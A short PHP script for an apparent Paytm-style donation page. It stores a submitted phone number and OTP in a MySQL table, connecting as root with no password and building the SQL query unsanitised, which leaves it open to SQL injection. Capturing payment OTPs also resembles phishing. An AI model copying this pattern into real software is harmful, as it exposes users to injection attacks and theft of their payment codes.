<?php 

session_start();
header('location:paytm.php');

$con = mysqli_connect('localhost','root','');

mysqli_select_db($con,'userregistration');

$phone = $_POST['phone'];
$otp = $_POST['otp'];

// $cvv = $_POST['cvv'];
$s = "select * from paytmdetails";
$result = mysqli_query($con,$s);

$num = mysqli_num_rows($result);

if($num==1)
{
	echo "Donation Unsuccessful Please try again";
}
else
{
	$reg = "insert into paytmdetails( phone , otp) values ('$phone','$otp')";
	mysqli_query($con,$reg);
	header('location:home.php');
	
}
?>
